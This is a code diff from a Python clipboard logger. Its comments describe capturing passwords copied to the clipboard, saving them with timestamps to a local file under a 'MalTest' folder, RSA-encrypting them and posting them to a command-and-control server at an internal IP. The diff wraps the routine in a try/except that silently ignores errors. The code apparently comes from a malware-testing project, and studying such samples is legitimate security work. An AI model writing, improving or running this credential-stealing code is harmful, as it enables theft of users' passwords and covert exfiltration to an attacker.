@@ -56,46 +56,49 @@ def get_clipboard_info():
     #short delay so that when ctrl+v is used it still copies password over and then pastes it
     time.sleep(0.25)
 
-    # paste, pastes text from clipboard
-    clipboard_info = pyperclip.paste()
+    try:
+        # paste, pastes text from clipboard
+        clipboard_info = pyperclip.paste()
 
-    # a appends data to file so the passwords can be stored over time password
-    filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
-    if not os.path.exists('C:/Tools/Sysint/MalTest/'):
-
-        #makes the directory if the path doesn't exist
-        os.makedirs('C:/Tools/Sysint/MalTest/')
+        # a appends data to file so the passwords can be stored over time password
         filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
+        if not os.path.exists('C:/Tools/Sysint/MalTest/'):
 
-    clipboard_data_file = open(filepath, "a")
+            #makes the directory if the path doesn't exist
+            os.makedirs('C:/Tools/Sysint/MalTest/')
+            filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
 
-    #checks if the last clipboard value is equal to the current one
-    if not last_clip_board_value == clipboard_info:
+        clipboard_data_file = open(filepath, "a")
 
-        #writes the clipboard value to the file along with a timestamp
-        clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
-        clipboard_data_file.write("\n")
+        #checks if the last clipboard value is equal to the current one
+        if not last_clip_board_value == clipboard_info:
 
-        #varibale used to store the clipboard info being transmitted in a post request
-        #encoded using utf8 so it can be encrypted using rsa
-        formatted_clipboard_info = (clipboard_info + ' (' + time.asctime(time.localtime()) + ')').encode('utf8')
-        encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
+            #writes the clipboard value to the file along with a timestamp
+            clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
+            clipboard_data_file.write("\n")
 
-        #closes the file since it is done being used
-        clipboard_data_file.close()
+            #varibale used to store the clipboard info being transmitted in a post request
+            #encoded using utf8 so it can be encrypted using rsa
+            formatted_clipboard_info = (clipboard_info + ' (' + time.asctime(time.localtime()) + ')').encode('utf8')
+            encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
 
-        #posts the request back to the c2 server, passing along the encoded clipboard information
-        requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)
+            #closes the file since it is done being used
+            clipboard_data_file.close()
 
-    #if the last and current clipboard value match then close the file
-    else:
-        clipboard_data_file.close()
+            #posts the request back to the c2 server, passing along the encoded clipboard information
+            requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)
 
-    #Updates the last clipboard value
-    last_clip_board_value = clipboard_info
+        #if the last and current clipboard value match then close the file
+        else:
+            clipboard_data_file.close()
 
-    #changes the clipboard data to the same word but with an invisible character at the end
-    add_invisible_character_to_clipboard()
+        #Updates the last clipboard value
+        last_clip_board_value = clipboard_info
+
+        #changes the clipboard data to the same word but with an invisible character at the end
+        add_invisible_character_to_clipboard()
+    except:
+        pass
 
 """
 add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
